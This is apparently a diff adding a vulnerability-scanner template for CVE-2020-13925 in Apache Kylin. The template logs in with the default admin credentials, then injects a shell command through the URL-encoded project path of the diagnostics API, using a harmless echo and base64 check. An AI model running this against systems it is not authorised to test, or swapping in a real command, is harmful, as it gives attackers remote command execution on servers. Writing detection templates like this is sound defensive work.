@@ -1,0 +1,58 @@
+id: apache-kylin-cmd-injection-cve-2020-13925
+
+info:
+  name: Apache Kylin Post-Auth Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache Kylin restful API concatenates the API inputs into OS commands and executes them on the server. This vulnerability allows attackers to execute OS commands remotely.
+  tags: cve,cve2020,command-injection,apache
+  classification:
+    cve-id: CVE-2020-13925
+    cvss-metrics: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.3
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13925
+    - https://www.freebuf.com/vuls/243541.html
+
+variables:
+  random_str: '{{rand_base(10)}}'
+  random_str_b64: '{{base64(random_str)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: authenticate
+    method: POST
+    path:
+      - "{{BaseURL}}/kylin/api/user/authentication"
+    headers:
+      Authorization: Basic YWRtaW46S1lMSU4=
+      Cookie: project=null
+    matchers:
+      - type: regex
+        regex:
+          - '^\{"userDetails":\{"username":".*?","password"'
+      - type: regex
+        regex:
+          - 'JSESSIONID=(.*?);'
+    extractors:
+      - type: regex
+        name: jsessionid
+        internal: true
+        group: 1
+        regex:
+          - 'JSESSIONID=(.*?);'
+
+  - id: command-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/kylin/api/diag/project/%7C%7C%60echo%20{{random_str}}%7Cbase64%60%7C%7C/download"
+    headers:
+      Cookie: "project=null;JSESSIONID={{jsessionid}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{random_str_b64}}"
